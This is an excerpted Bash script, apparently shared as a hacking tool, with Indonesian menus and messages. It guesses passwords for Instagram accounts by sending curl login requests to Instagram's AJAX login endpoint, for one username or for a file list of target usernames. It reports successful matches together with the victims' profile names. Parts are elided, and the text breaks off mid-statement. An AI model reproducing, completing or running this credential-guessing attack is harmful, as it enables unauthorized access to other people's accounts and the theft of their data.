...
do
    command -v $i >/dev/null 2>&1 || {
        echo >&2 "$i : belum terinstal - instal dengan ketik : apt install $i -y"
        exit
    }
done
...
#banner
figlet Ethereal
echo '++++++++++++SAKTI MANDRAGUNA+++++++++++'
echo 'RECODED by : Rahmad Alif'
echo 'RECODED again by : Ethereal'
...
case $opt in
    1) #menu 1
        ...
        read -p $'[\e[1;34m?\e[1;37m] Password Tebakan   : \e[1;33m' pass
    ...
    2) #menu 2
        ...
        exit
            ...
            read -p $'[\e[34m?\e[37m] Password Tebakan   : \e[1;33m' pass
            echo -e "${white}[${yellow}!${white}] ${red}Sedang mengcrack...${white}"
    ...
    3) #menu 3
        ...
        if [[ ! -e $list ]]; then
            echo -e "${red}filenya gak ada bos${white}"
            exit
            else
                cat $list > target
...
function brute(){
    url=$(curl -s -c cookie.txt -X POST "https://www.instagram.com/accounts/login/ajax/" \
                    ...
                    if [[ $login =~ "true" ]]; then
                            echo -e "[${green}+${white}] ${green}Mantap! Cocok bro... ${blue}[${yellow}@$i - $pass${blue}] ${white}- dengan: "$(curl -s "https://www.instagram.com/$i/" | grep "<meta content=" | cut -d '"' -f2 | cut -d "," -f1)
                        elif [[ $login =~ "false" ]]; then
                                    echo -e "[${red}!${white}] @$i - ${red}Password Gk Cocok ${white}"
                            elif [[ $url =~ "checkpoint_required" ]]; then
                                    echo -e "[${cyan}?${white}] @$i ${white}: ${cyan}Kehalang Verifikasi${white}"
                    fi
}
...
rm target
read -p $'\e[37m[\e[34m?\e[37m] Mau lanjut cari lagi? [y/n] : \e[1;33m' akhir
if [[ $akhir =~ "y" ]]; then
		clear
		bash ethereal.sh
	elif [[ $login =~ "Y" ]]; then
